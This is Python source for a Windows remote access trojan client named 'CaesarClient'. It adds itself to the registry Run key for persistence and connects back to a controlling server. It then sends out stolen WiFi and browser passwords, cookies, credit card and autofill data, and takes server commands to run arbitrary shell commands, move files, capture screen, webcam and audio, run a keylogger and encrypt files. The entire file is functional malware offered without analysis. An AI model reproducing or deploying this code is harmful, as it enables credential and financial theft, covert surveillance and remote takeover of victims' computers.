import socket
import time
import os
import subprocess
from general_features import GeneralFeatures
from systeminfo_harvester import SystemInfoHarvester
import winreg
import sys



class CaesarClient:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.generalFeatures = GeneralFeatures()
        self.systemInfoHarvester = SystemInfoHarvester()


    def add_to_startup(self, script_path):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_ALL_ACCESS,
            )

            winreg.SetValueEx(key, "Caesar", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
        except Exception as e:
            pass
            #print(e)


    #tries to connect back to the server
    def establish_connection(self):
        self.add_to_startup(os.path.abspath(sys.argv[0]))

        sock = str()
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, self.port))
                break
            except socket.error as err:
                time.sleep(120) #try to reconnect after 2 minutes


        ######################################## Harvest Target Info ###################################################

        self.systemInfoHarvester.get_platform_info(sock)
        self.systemInfoHarvester.send_installed_apps(sock)
        self.systemInfoHarvester.get_user_startup_programs(sock)
        self.systemInfoHarvester.get_wifi_password(sock)

        self.systemInfoHarvester.get_browser_passwords(sock)
        self.systemInfoHarvester.get_browser_cookies(sock)
        self.systemInfoHarvester.retrieve_browser_history(sock)
        self.systemInfoHarvester.retrieve_creditcard_info(sock)

        self.systemInfoHarvester.retrieve_autofill_info(sock)
        self.systemInfoHarvester.extract_memory_info(sock)
        self.systemInfoHarvester.extract_disk_info(sock)
        self.systemInfoHarvester.extract_network_info(sock)

        self.systemInfoHarvester.get_user_activity(sock)
        self.systemInfoHarvester.extract_other_info(sock)

        ######################################## Harvest Target Info ###################################################


        #check command sent from the server
        while True:
            cmd = sock.recv(65536).decode()
            if cmd == " ":
                sock.send(self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode()) #send current working directory back to server
            elif cmd[:2] == 'cd':
                #change directory
                try:
                    os.chdir(cmd[3:])
                    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = result.stdout.read() + result.stderr.read()
                    result = "\n" + result.decode()
                    if "The system cannot find the path specified." in result:
                        result = "\n"
                        sock.send(str(result).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                    else:
                        sock.send(str(result).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                except(FileNotFoundError, IOError):
                    sock.send("Directory does not exist!!! \n".encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
            elif "get" in cmd:
                self.generalFeatures.send_client_file(sock, cmd[4:])

            elif "send" in cmd:
                usrFile = os.path.basename(cmd[5:])
                self.generalFeatures.receive_server_file(sock, usrFile)
            elif cmd == "screenshot":
                self.generalFeatures.screenshot(sock)
            elif cmd == "screenfeed":
                self.generalFeatures.live_screen_feed(sock)
            elif cmd == "camshot":
                self.generalFeatures.webcam_capture(sock)
            elif cmd == "camfeed":
                self.generalFeatures.capture_webcam_video(sock)
            elif cmd == "audiofeed":
                self.generalFeatures.live_audio_feed(sock)
            elif "start keylogger" in cmd:
                cmd = cmd.split()
                self.generalFeatures.keylogger_handler(sock, cmd[2], cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
            elif cmd == "stop keylogger":
                self.generalFeatures.stop_keylogger(sock)
            elif cmd == "keylogger status":
                self.generalFeatures.is_keylogger_active(sock)
            elif cmd == "reboot":
                self.generalFeatures.reboot(sock)
            elif cmd == "shutdown":
                self.generalFeatures.shutdown(sock)


            elif "ftp download" in cmd:
                cmd = cmd.split(" ", 8)
                if len(cmd) == 8:
                    self.generalFeatures.download_file_via_ftp(sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])

                elif len(cmd) > 8 or len(cmd) < 8:
                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())


            elif "ftp upload" in cmd:
                cmd = cmd.split(" ", 8)
                if len(cmd) == 8:
                    self.generalFeatures.upload_file_via_ftp(sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])

                elif len(cmd) > 8 or len(cmd) < 8:
                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())

            elif "encrypt" in cmd:
                cmd = cmd.split(" ", 2)

                if len(cmd) == 3:
                    self.generalFeatures.encrypt_file(sock, "".join(cmd[1]), "".join(cmd[2]))
                elif len(cmd) > 3 or len(cmd) < 3:
                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())


            elif "decrypt" in cmd:
                cmd = cmd.split(" ", 2)
                if len(cmd) == 3:
                    self.generalFeatures.decrypt_file(sock, "".join(cmd[1]), "".join(cmd[2]))
                elif len(cmd) > 3 or len(cmd) < 3:
                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())


            elif cmd == "conn check":
                pass
            else:
                try:
                    #return terminal output back to server
                    terminal_output = subprocess.Popen(cmd, shell=True,
                                                       stdout=subprocess.PIPE,
                                                       stderr=subprocess.PIPE,
                                                       stdin=subprocess.PIPE)

                    terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
                    terminal_output = terminal_output.decode()
                    sock.send(str(terminal_output).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                except Exception as e:
                    sock.send(str(e).encode() + "\n".encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())

